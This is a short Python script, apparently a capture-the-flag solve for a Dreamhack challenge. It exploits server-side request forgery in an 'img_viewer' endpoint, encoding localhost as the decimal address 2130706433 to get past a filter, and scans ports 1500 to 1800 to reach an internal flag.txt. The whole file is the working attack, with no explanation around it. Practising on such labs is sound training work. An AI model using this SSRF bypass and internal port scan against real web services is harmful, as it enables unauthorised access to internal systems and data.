import requests


def imgRequest(port):
    data = {"url": f"http://2130706433:{port}/flag.txt"}
    res = requests.post("http://host1.dreamhack.games:22117/img_viewer", data=data)

    if "iVBORw0KGgoAAAA" not in res.text:
        print(f"port : {port}")
        return True


if __name__ == "__main__":
    for i in range(1500, 1800 + 1):
        if imgRequest(i):
            quit()